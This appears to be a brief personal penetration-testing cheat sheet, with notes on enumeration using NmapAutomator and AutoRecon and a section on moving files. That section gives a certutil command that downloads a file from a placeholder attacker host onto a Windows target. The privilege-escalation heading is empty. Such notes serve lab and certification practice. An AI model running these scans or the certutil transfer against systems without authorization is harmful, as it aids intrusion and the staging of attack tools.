### Enumeration 

- NmapAutomator (https://github.com/21y4d/nmapAutomator)
	- Scan Vulns (5 to 15 mins).  Usually what I start with
```
nmapAutomator.sh -t Vulns -o nmap_automator -H <IP>
```
- AutoRecon (https://github.com/Tib3rius/AutoRecon)
```
autorecon <ip>
```

### Moving files

- Certutil: on most Windows machine by default, super easy
```powershell
certutil -urlcache -split -f [http://IP/file]
```


### Priv Esc


